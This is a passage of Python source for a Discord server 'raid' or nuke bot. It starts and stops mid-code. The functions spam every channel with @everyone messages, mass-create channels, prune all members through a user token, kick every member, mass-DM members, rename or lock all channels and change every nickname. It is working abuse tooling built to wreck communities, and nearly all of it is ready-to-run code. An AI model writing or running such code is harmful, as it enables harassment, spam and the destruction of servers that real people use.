        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[-] CAN'T SEND MESSAGES TO CHANNEL {channel.name}: {e}")))
        return False
    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[+] COMMAND USED: SPAM - {num_messages} MESSAGES SENT TO ALL TEXT CHANNELS - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS")))
        else:
            log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[-] GUILD NOT FOUND.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[-] MESSAGE COULDN'T BE SENT TO CHANNEL {e}")))

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(Colorate.Horizontal(Colors.yellow_to_green, f"""[+] COMMAND USED: CREATE CHANNELS - {channels_created} {channel_type} CHANNELS CREATED, {channels_not_created} CHANNELS NOT CREATED - TOTAL TIME TAKEN: {end_time_total - start_time_total:.2f} SECONDS"""))

        else:
            log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[-] THERE IS NO SUCH SERVER AS YOU ENTERED.")))
    except Exception as e:
        log_message((Colorate.Horizontal(Colors.yellow_to_green,f"[-] PLEASE GIVE THE BOT ADMINISTRATOR PERMISSIONS: {e}"))) 

# ============================================ FAST MSG SPAM ONLY FUNCTION ============================================
async def msg_spam_only(server_id):
    """ULTRA FAST VERSION - Sirf message spam, koi delay nahi"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] GUILD NOT FOUND."))
            return

        num_messages = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "HOW MANY MESSAGES PER CHANNEL? ~ "))
        try:
            num_messages = int(num_messages)
        except ValueError:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] INVALID NUMBER."))
            return

        message_content = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER MESSAGE TO SPAM ~ "))
        
        if not message_content:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] MESSAGE CANNOT BE EMPTY."))
            return

        include_everyone = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "INCLUDE @everyone? (y/n) ~ "))
        include_everyone = include_everyone.lower() == 'y'

        text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
        
        if not text_channels:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO TEXT CHANNELS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] STARTING FAST SPAM ON {len(text_channels)} CHANNELS x {num_messages} MSGS"))
        
        start_time_total = time.time()
        
        final_msg = f"@everyone {message_content}" if include_everyone else message_content
        
        async def fast_spam(channel):
            try:
                for _ in range(num_messages):
                    await channel.send(final_msg)
                return True
            except:
                return False
        
        results = await asyncio.gather(*[fast_spam(ch) for ch in text_channels])
        
        end_time_total = time.time()
        
        successful = sum(results)
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FAST SPAM COMPLETE! {successful}/{len(text_channels)} channels successful"))
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] Total messages sent: {successful * num_messages}"))
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] Time taken: {end_time_total - start_time_total:.2f} seconds"))
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] Speed: {(successful * num_messages) / (end_time_total - start_time_total):.0f} msgs/sec"))
        
    except Exception as e:
        print(Colorate.Horizontal(Colors.yellow_to_green, f"[-] ERROR IN SPAM: {e}"))

# ============================================ PRUNE ALL MEMBERS ============================================
async def prune_members(server_id):
    """Prune ALL members using USER token"""
    try:
        # Direct token asking
        user_token = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "🔐 ENTER USER TOKEN ~ "))
        
        if not user_token or len(user_token) < 50:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID USER TOKEN!"))
            return

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "PRUNE ALL MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] STARTING PRUNE..."))
        
        total_pruned = 0
        batch = 1
        start_time_total = time.time()
        
        async with aiohttp.ClientSession() as session:
            headers = {
                "Authorization": user_token,
                "Content-Type": "application/json"
            }
            
            while True:
                url_members = f"https://discord.com/api/v9/guilds/{server_id}/members?limit=1000"
                async with session.get(url_members, headers=headers) as member_response:
                    if member_response.status == 200:
                        members = await member_response.json()
                        
                        if not members:
                            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ TOTAL PRUNED: {total_pruned}"))
                            break
                        
                        url_prune = f"https://discord.com/api/v9/guilds/{server_id}/prune"
                        params = {"days": 1, "compute_prune_count": False}
                        
                        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] BATCH {batch}: PRUNING {len(members)} MEMBERS..."))
                        start_time = time.time()
                        
                        async with session.post(url_prune, headers=headers, json=params) as response:
                            if response.status == 200:
                                data = await response.json()
                                pruned = data.get('pruned', 0)
                                total_pruned += pruned
                                end_time = time.time()
                                
                                print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ BATCH {batch}: {pruned} MEMBERS (Time: {end_time - start_time:.2f}s)"))
                                batch += 1
                                
                                if pruned < 1000:
                                    print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ COMPLETE! TOTAL: {total_pruned}"))
                                    break
                                    
                            elif response.status == 429:
                                retry_data = await response.json()
                                wait = retry_data.get('retry_after', 5)
                                print(Colorate.Horizontal(Colors.yellow, f"[-] RATE LIMITED. WAITING {wait}s..."))
                                await asyncio.sleep(wait)
                                continue
                                
                            elif response.status == 403:
                                print(Colorate.Horizontal(Colors.red_to_blue, "[-] PERMISSION DENIED!"))
                                break
                                
                            else:
                                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] PRUNE FAILED: {response.status}"))
                                break
                                
                    elif member_response.status == 429:
                        retry_data = await response.json()
                        wait = retry_data.get('retry_after', 5)
                        print(Colorate.Horizontal(Colors.yellow, f"[-] RATE LIMITED. WAITING {wait}s..."))
                        await asyncio.sleep(wait)
                        continue
                        
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member_response.status}"))
                        if member_response.status == 401:
                            print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID TOKEN!"))
                        break
                
                await asyncio.sleep(0.3)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

# ============================================ UNBAN ALL ============================================
async def unban_all(server_id):
    """Unban ALL banned members from the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "UNBAN ALL MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] FETCHING BANNED MEMBERS..."))
        
        # FIX: async for use karo (not await)
        banned_users = []
        async for ban_entry in guild.bans():
            banned_users.append(ban_entry.user)
        
        if not banned_users:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NO BANNED MEMBERS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(banned_users)} BANNED MEMBERS"))
        
        if len(banned_users) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(banned_users)} MEMBERS WILL BE UNBANNED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] STARTING UNBAN..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        unbanned = 0
        failed = 0
        start_time = time.time()
        
        # BATCH PROCESSING - 10 members ek saath
        batch_size = 10
        total_members = len(banned_users)
        
        for i in range(0, total_members, batch_size):
            batch = banned_users[i:i+batch_size]
            tasks = []
            
            for user in batch:
                tasks.append(unban_user_task(guild, user))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                user = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {user.name} failed"))
                else:
                    unbanned += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"🔓 {user.name} unbanned"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'BAN MEMBERS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def unban_user_task(guild, user):
    """Helper function for unbanning a single user"""
    await guild.unban(user)
    return True  
# ============================================ LOCK ALL CHANNELS ============================================
async def lock_all_channels(server_id):
    """Lock ALL channels - ULTRA FAST (100 channels in 2-3 sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "LOCK ALL CHANNELS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_channels:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE CHANNELS' PERMISSION!"))
            return

        channels = [ch for ch in guild.channels if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))]
        
        if not channels:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO CHANNELS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(channels)} CHANNELS"))
        
        if len(channels) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(channels)} CHANNELS WILL BE LOCKED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] LOCKING CHANNELS..."))
        
        locked = 0
        failed = 0
        start_time = time.time()
        
        everyone = guild.default_role
        overwrite = discord.PermissionOverwrite()
        overwrite.send_messages = False
        overwrite.connect = False
        
        # BATCH PROCESSING - Sab ek saath
        tasks = []
        for channel in channels:
            tasks.append(lock_channel_task(channel, everyone, overwrite))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"❌ #{channels[i].name} failed"))
            else:
                locked += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f" #{channels[i].name} locked"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE CHANNELS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def lock_channel_task(channel, everyone, overwrite):
    """Helper function for locking a single channel"""
    await channel.set_permissions(everyone, overwrite=overwrite)
    return True

# ============================================ UNLOCK ALL CHANNELS ============================================
async def unlock_all_channels(server_id):
    """Unlock ALL channels - ULTRA FAST (100 channels in 2-3 sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "UNLOCK ALL CHANNELS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_channels:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE CHANNELS' PERMISSION!"))
            return

        channels = [ch for ch in guild.channels if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))]
        
        if not channels:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO CHANNELS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(channels)} CHANNELS"))
        
        if len(channels) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(channels)} CHANNELS WILL BE UNLOCKED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] UNLOCKING CHANNELS..."))
        
        unlocked = 0
        failed = 0
        start_time = time.time()
        
        everyone = guild.default_role
        
        # BATCH PROCESSING - Sab ek saath
        tasks = []
        for channel in channels:
            tasks.append(unlock_channel_task(channel, everyone))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"❌ #{channels[i].name} failed"))
            else:
                unlocked += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f" #{channels[i].name} unlocked"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE CHANNELS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def unlock_channel_task(channel, everyone):
    """Helper function for unlocking a single channel"""
    await channel.set_permissions(everyone, overwrite=None)
    return True

# ============================================ SHIFT SERVER ============================================
async def shift_server():
    """Switch to another server"""
    global server_id
    
    print(Colorate.Horizontal(Colors.yellow, "=" * 60))
    print(Colorate.Horizontal(Colors.yellow_to_green, "[+] SHIFTING TO ANOTHER SERVER..."))
    print(Colorate.Horizontal(Colors.yellow, "=" * 60))
    
    # Show current server
    try:
        current_guild = bot.get_guild(int(server_id))
        if current_guild:
            print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] CURRENT SERVER: {current_guild.name} ({server_id})"))
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[-] CURRENT SERVER NOT FOUND: {server_id}"))
    except:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] CURRENT SERVER: {server_id}"))
    
    print(Colorate.Horizontal(Colors.yellow, "-" * 60))
    
    # Get new server ID
    new_server_id = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER NEW GUILD ID ~ "))
    
    if not new_server_id:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
        return
    
    try:
        # Check if new server exists
        new_guild = bot.get_guild(int(new_server_id))
        if new_guild:
            # Update global server_id
            server_id = new_server_id
            print(Colorate.Horizontal(Colors.green_to_blue, f"[+] ✅ SWITCHED TO: {new_guild.name} ({server_id})"))
            print(Colorate.Horizontal(Colors.green_to_blue, "[+] ✅ SERVER SWITCHED SUCCESSFULLY!"))
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, f"[-] SERVER NOT FOUND OR BOT NOT IN SERVER: {new_server_id}"))
            
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID. PLEASE ENTER NUMERIC ID."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

# ============================================ MASS KICK ============================================
async def mass_kick(server_id):
    """Kick ALL members - ULTRA FAST (500 members in 10 sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.kick_members:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'KICK MEMBERS' PERMISSION!"))
            return

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, "KICK ALL MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] FETCHING MEMBERS..."))
        
        # Get all members (excluding bot)
        members = [m for m in guild.members if m.id != bot.user.id]
        
        if not members:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO MEMBERS TO KICK."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(members)} MEMBERS TO KICK"))
        
        if len(members) > 50:
            confirm2 = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"⚠️ {len(members)} MEMBERS WILL BE KICKED. CONTINUE? Y/N ~ "))
            if confirm2.lower() != 'y':
                print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
                return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] STARTING MASS KICK..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        kicked = 0
        failed = 0
        start_time = time.time()
        
        # BATCH PROCESSING - 10 members ek saath
        batch_size = 10
        total_members = len(members)
        
        for i in range(0, total_members, batch_size):
            batch = members[i:i+batch_size]
            tasks = []
            
            for member in batch:
                tasks.append(kick_member_task(member))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                member = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {member.name} failed"))
                else:
                    kicked += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f" {member.name} kicked"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'KICK MEMBERS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def kick_member_task(member):
    """Helper function for kicking a single member"""
    await member.kick(reason="MASS KICK BY REX")
    return True 

# ============================================ MASS DM ALL ============================================
async def mass_dm_all(server_id):
    """Send DM to ALL members in the server"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] FETCHING MEMBERS..."))
        
        # Get all members (excluding bots)
        members = [m for m in guild.members if not m.bot]
        
        if not members:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO MEMBERS TO DM."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(members)} MEMBERS"))
        
        # Get message
        message = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER MESSAGE TO SEND ~ "))
        
        if not message:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] MESSAGE CANNOT BE EMPTY."))
            return
        
        # Get number of messages per member
        num_msgs = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "HOW MANY MESSAGES PER MEMBER? (MAX 5) ~ "))
        try:
            num_msgs = int(num_msgs)
            if num_msgs > 5:
                num_msgs = 5
                print(Colorate.Horizontal(Colors.yellow, "[!] MAX 5 MESSAGES PER MEMBER"))
            if num_msgs < 1:
                num_msgs = 1
        except ValueError:
            num_msgs = 1
            print(Colorate.Horizontal(Colors.yellow, "[!] USING DEFAULT: 1 MESSAGE"))

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"SEND {num_msgs} MESSAGE(S) TO {len(members)} MEMBERS? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] STARTING MASS DM..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 50))
        
        sent = 0
        failed = 0
        start_time = time.time()
        
        for member in members:
            try:
                for i in range(num_msgs):
                    await member.send(message)
                    sent += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] DM SENT TO: {member.name}#{member.discriminator} ({member.id}) - MSG {i+1}/{num_msgs}"))
                await asyncio.sleep(0.2)  # Rate limit
            except discord.Forbidden:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member.name} (DMs CLOSED OR BLOCKED)"))
            except discord.HTTPException as e:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member.name} (RATE LIMITED OR ERROR)"))
            except Exception as e:
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"[-] FAILED: {member.name} ({e})"))
            
            # Thoda wait
            await asyncio.sleep(0.1)
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT CAN'T DM MEMBERS!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))  

# ============================================ RENAME CHANNELS ============================================
async def rename_channels(server_id):
    """Rename ALL channels - ULTRA FAST (100 channels in 2-3 sec)"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_channels:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE CHANNELS' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] RENAME ALL CHANNELS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get all channels (text + voice)
        channels = [ch for ch in guild.channels if isinstance(ch, (discord.TextChannel, discord.VoiceChannel))]
        
        if not channels:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO CHANNELS FOUND."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(channels)} CHANNELS"))

        # Get new channel name
        new_name = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER NEW CHANNEL NAME ~ "))
        
        if not new_name:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] NAME CANNOT BE EMPTY."))
            return

        # Add random numbers option
        random_option = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ADD RANDOM NUMBERS? (y/n) ~ "))
        random_option = random_option.lower() == 'y'

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"RENAME {len(channels)} CHANNELS TO '{new_name}'? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] RENAMING CHANNELS..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        renamed = 0
        failed = 0
        start_time = time.time()
        
        # BATCH PROCESSING - Sab ek saath
        tasks = []
        for channel in channels:
            if random_option:
                random_num = random.randint(1, 9999)
                name = f"{new_name}{random_num}"
            else:
                name = new_name
            tasks.append(rename_channel_task(channel, name))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed += 1
                print(Colorate.Horizontal(Colors.red_to_blue, f"❌ #{channels[i].name} failed"))
            else:
                renamed += 1
                print(Colorate.Horizontal(Colors.yellow_to_green, f" #{channels[i].name} -> {result}"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE CHANNELS' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def rename_channel_task(channel, name):
    """Helper function for renaming a single channel"""
    await channel.edit(name=name)
    return name

# ============================================ NICK CHANGE ALL ============================================
async def nick_change_all(server_id):
    """Change nickname of ALL members - REAL TIME + HYPER FAST"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_nicknames:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE NICKNAMES' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] NICK CHANGE ALL"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get members (excluding bots)
        members = [m for m in guild.members if not m.bot and m.id != bot.user.id]
        
        if not members:
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] NO MEMBERS TO CHANGE NICK."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, f"[+] FOUND {len(members)} MEMBERS"))

        # Get nickname
        new_nick = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ENTER NEW NICKNAME ~ "))
        
        if not new_nick:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] NICKNAME CANNOT BE EMPTY."))
            return

        # Random nick option
        random_option = await asyncio.to_thread(input, Colorate.Horizontal(Colors.yellow_to_green, "ADD RANDOM NUMBERS? (y/n) ~ "))
        random_option = random_option.lower() == 'y'

        confirm = await asyncio.to_thread(input, Colorate.Horizontal(Colors.red_to_blue, f"CHANGE NICKNAME OF {len(members)} MEMBERS TO '{new_nick}'? Y/N ~ "))
        if confirm.lower() != 'y':
            print(Colorate.Horizontal(Colors.yellow_to_green, "[-] OPERATION CANCELED."))
            return

        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] CHANGING NICKNAMES..."))
        print(Colorate.Horizontal(Colors.yellow, "-" * 40))
        
        changed = 0
        failed = 0
        start_time = time.time()
        
        # HYPER BATCH - 30 members ek saath
        batch_size = 30
        total_members = len(members)
        
        for i in range(0, total_members, batch_size):
            batch = members[i:i+batch_size]
            tasks = []
            nicknames = []
            
            for member in batch:
                if random_option:
                    random_num = random.randint(1, 9999)
                    nick = f"{new_nick}{random_num}"
                else:
                    nick = new_nick
                nicknames.append(nick)
                tasks.append(change_nick_task(member, nick))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                member = batch[j]
                if isinstance(result, Exception):
                    failed += 1
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ {member.name} nick change failed"))
                else:
                    changed += 1
                    print(Colorate.Horizontal(Colors.yellow_to_green, f" {member.name} nick changed -> {nicknames[j]}"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID SERVER ID."))
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT DOESN'T HAVE 'MANAGE NICKNAMES' PERMISSION!"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"[-] ERROR: {e}"))

async def change_nick_task(member, nick):
    """Helper function for changing a single member's nickname"""
    await member.edit(nick=nick)
    return True

# ============================================ UNNICK ALL ============================================
async def unnick_all(server_id):
    """Remove nickname from ALL members - REAL TIME + HYPER FAST"""
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] SERVER NOT FOUND."))
            return

        # Check bot permissions
        bot_member = guild.get_member(bot.user.id)
        if not bot_member.guild_permissions.manage_nicknames:
            print(Colorate.Horizontal(Colors.red_to_blue, "[-] BOT NEEDS 'MANAGE NICKNAMES' PERMISSION!"))
            return

        print(Colorate.Horizontal(Colors.yellow, "=" * 60))
        print(Colorate.Horizontal(Colors.yellow_to_green, "[+] UNNICK ALL MEMBERS"))
        print(Colorate.Horizontal(Colors.yellow, "=" * 60))

        # Get members with nicknames (excluding bots and self)
        members_with_nick = [m for m in guild.members if m.nick is not None and not m.bot and m.id != bot.user.id]
        
        if not members_with_nick:
